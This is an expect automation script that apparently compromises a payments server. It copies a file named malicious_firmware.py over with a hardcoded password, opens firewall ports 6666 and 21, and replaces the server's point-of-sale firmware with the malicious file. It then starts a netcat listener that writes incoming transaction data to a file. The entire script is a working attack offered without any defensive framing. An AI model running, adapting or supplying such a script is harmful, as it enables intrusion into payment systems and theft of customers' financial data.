#!/usr/bin/expect -f

spawn scp /home/ubuntu/malicious_firmware.py john@payments.fazio.com:/home/john/malicious_firmware.py

expect {
  "key fingerprint" {send "yes\r"; exp_continue}
  "password:" {send "blackhat\r"}
}

expect "100%"
wait 1
send "exit\r"

wait 1

spawn ssh john@payments.fazio.com

expect {
  "key fingerprint" {send "yes\r"; exp_continue}
  "password:" {send "blackhat\r"}
}

expect "$ "
send "sudo ufw allow 6666\r"

expect "$ "
send "sudo ufw allow 21\r"

expect "$ "
send "sudo mv /home/john/malicious_firmware.py /home/ubuntu/payment-server/pos_firmware.py\r"

expect "$ "
send "sudo nc -k -l 6666 >/home/john/transactions.txt 2>&1 &\r"

expect "$ "
send "exit\r"